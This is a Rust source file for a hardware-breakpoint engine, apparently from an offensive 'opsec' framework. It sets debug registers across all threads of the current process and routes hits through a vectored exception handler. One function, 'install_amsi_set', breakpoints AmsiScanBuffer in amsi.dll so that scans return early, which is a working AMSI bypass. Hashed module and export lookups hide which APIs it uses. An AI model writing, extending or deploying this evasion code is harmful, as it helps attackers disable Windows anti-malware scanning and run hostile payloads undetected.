use crate::descriptor::{CallbackKind, Descriptor};
use crate::veh;
use opsec_bootstrap::Bootstrap;
use opsec_peb::{resolve_export, resolve_module};
use opsec_strcrypt::hash;
use core::ffi::c_void;

use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
use windows_sys::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, RemoveVectoredExceptionHandler,
    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
};
use windows_sys::Win32::System::Threading::{GetCurrentProcessId, OpenThread, THREAD_ALL_ACCESS};

#[derive(Debug)]
pub enum Error {
    BootstrapFailed,
    VehInstallFailed,
    NoSlotFree,
    KernelHandleFailed,
}

pub struct HwbpEngine {
    veh_handle: *mut c_void,
    bootstrap: Bootstrap,
}

unsafe impl Send for HwbpEngine {}
unsafe impl Sync for HwbpEngine {}

pub struct HwbpGuard<'e> {
    engine: &'e HwbpEngine,
    address: usize,
}

impl HwbpEngine {
    pub unsafe fn init() -> Result<Self, Error> {
        unsafe {
            let bootstrap = Bootstrap::init().map_err(|_| Error::BootstrapFailed)?;

            type DispatchFn = unsafe extern "system" fn(*mut c_void) -> i32;
            let dispatch_fn: DispatchFn = core::mem::transmute(
                veh::dispatch as unsafe extern "system" fn(*mut _) -> i32,
            );
            use windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS;
            type VehFn = unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32;
            let veh_handle = AddVectoredExceptionHandler(1, Some(core::mem::transmute::<DispatchFn, VehFn>(dispatch_fn)));
            if veh_handle.is_null() {
                return Err(Error::VehInstallFailed);
            }
            Ok(HwbpEngine { veh_handle, bootstrap })
        }
    }

    pub unsafe fn install_rip_ret(
        &self,
        target: usize,
        slot: u8,
    ) -> Result<HwbpGuard<'_>, Error> {
        unsafe {
            veh::table().insert(Descriptor {
                address: target,
                slot,
                thread_id: 0,
                callback: CallbackKind::RipRet,
            });
            self.apply_breakpoint_to_all_threads(target, slot, true)?;
            Ok(HwbpGuard { engine: self, address: target })
        }
    }

    pub unsafe fn install_exit_trap(
        &self,
        target: usize,
        slot: u8,
        resume_rip: usize,
        resume_rsp: usize,
    ) -> Result<HwbpGuard<'_>, Error> {
        unsafe {
            veh::table().insert(Descriptor {
                address: target,
                slot,
                thread_id: 0,
                callback: CallbackKind::ExitTrap { resume_rip, resume_rsp },
            });
            self.apply_breakpoint_to_all_threads(target, slot, true)?;
            Ok(HwbpGuard { engine: self, address: target })
        }
    }

    pub unsafe fn install_amsi_set(&self) -> Result<HwbpGuard<'_>, Error> {
        unsafe {
            let amsi = resolve_module(hash!("amsi.dll"))
                .ok_or(Error::KernelHandleFailed)?;
            let targets = [
                resolve_export(amsi, hash!("AmsiScanBuffer")),
            ];
            let mut first: Option<usize> = None;
            for (i, t) in targets.into_iter().flatten().enumerate() {
                let addr = t as usize;
                if first.is_none() {
                    first = Some(addr);
                }
                let slot = (i + 1) as u8;
                veh::table().insert(Descriptor {
                    address: addr,
                    slot,
                    thread_id: 0,
                    callback: CallbackKind::RipRet,
                });
                self.apply_breakpoint_to_all_threads(addr, slot, true)?;
            }
            Ok(HwbpGuard {
                engine: self,
                address: first.ok_or(Error::KernelHandleFailed)?,
            })
        }
    }

    unsafe fn apply_breakpoint_to_all_threads(
        &self,
        address: usize,
        slot: u8,
        enable: bool,
    ) -> Result<(), Error> {
        unsafe {
            let pid = GetCurrentProcessId();
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if snap == INVALID_HANDLE_VALUE {
                return Err(Error::KernelHandleFailed);
            }

            let mut te: THREADENTRY32 = core::mem::zeroed();
            te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
            if Thread32First(snap, &mut te) != 0 {
                loop {
                    if te.th32OwnerProcessID == pid {
                        let thread = OpenThread(THREAD_ALL_ACCESS, 0, te.th32ThreadID);
                        if !thread.is_null() {
                            self.set_dr_on_thread(thread, address, slot, enable);
                            CloseHandle(thread);
                        }
                    }
                    te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
                    if Thread32Next(snap, &mut te) == 0 {
                        break;
                    }
                }
            }
            CloseHandle(snap);
            Ok(())
        }
    }

    unsafe fn set_dr_on_thread(
        &self,
        thread: *mut c_void,
        address: usize,
        slot: u8,
        enable: bool,
    ) {
        unsafe {
            let mut ctx: CONTEXT = core::mem::zeroed();
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
            if self
                .bootstrap
                .nt_get_context_thread(thread, &mut ctx as *mut _ as *mut c_void)
                < 0
            {
                return;
            }
            match slot {
                0 => {
                    if enable {
                        ctx.Dr0 = address as u64;
                        ctx.Dr7 &= !(3u64 << 16);
                        ctx.Dr7 &= !(3u64 << 18);
                        ctx.Dr7 |= 1u64;
                    } else if ctx.Dr0 == address as u64 {
                        ctx.Dr7 &= !1u64;
                        ctx.Dr0 = 0;
                    }
                }
                1 => {
                    if enable {
                        ctx.Dr1 = address as u64;
                        ctx.Dr7 &= !(3u64 << 20);
                        ctx.Dr7 &= !(3u64 << 22);
                        ctx.Dr7 |= 1u64 << 2;
                    } else if ctx.Dr1 == address as u64 {
                        ctx.Dr7 &= !(1u64 << 2);
                        ctx.Dr1 = 0;
                    }
                }
                2 => {
                    if enable {
                        ctx.Dr2 = address as u64;
                        ctx.Dr7 &= !(3u64 << 24);
                        ctx.Dr7 &= !(3u64 << 26);
                        ctx.Dr7 |= 1u64 << 4;
                    } else if ctx.Dr2 == address as u64 {
                        ctx.Dr7 &= !(1u64 << 4);
                        ctx.Dr2 = 0;
                    }
                }
                3 => {
                    if enable {
                        ctx.Dr3 = address as u64;
                        ctx.Dr7 &= !(3u64 << 28);
                        ctx.Dr7 &= !(3u64 << 30);
                        ctx.Dr7 |= 1u64 << 6;
                    } else if ctx.Dr3 == address as u64 {
                        ctx.Dr7 &= !(1u64 << 6);
                        ctx.Dr3 = 0;
                    }
                }
                _ => return,
            }
            self.bootstrap
                .nt_set_context_thread(thread, &ctx as *const _ as *const c_void);
        }
    }
}

impl Drop for HwbpEngine {
    fn drop(&mut self) {
        let descriptors = veh::table().snapshot();
        for d in &descriptors {
            unsafe {
                self.apply_breakpoint_to_all_threads(d.address, d.slot, false)
                    .ok();
            }
        }
        veh::table().clear();
        unsafe {
            RemoveVectoredExceptionHandler(self.veh_handle);
        }
    }
}

impl Drop for HwbpGuard<'_> {
    fn drop(&mut self) {
        let snapshot = veh::table().snapshot();
        for d in snapshot.iter().filter(|d| d.address == self.address) {
            unsafe {
                self.engine
                    .apply_breakpoint_to_all_threads(d.address, d.slot, false)
                    .ok();
            }
        }
        veh::table().remove(self.address, 0);
    }
}
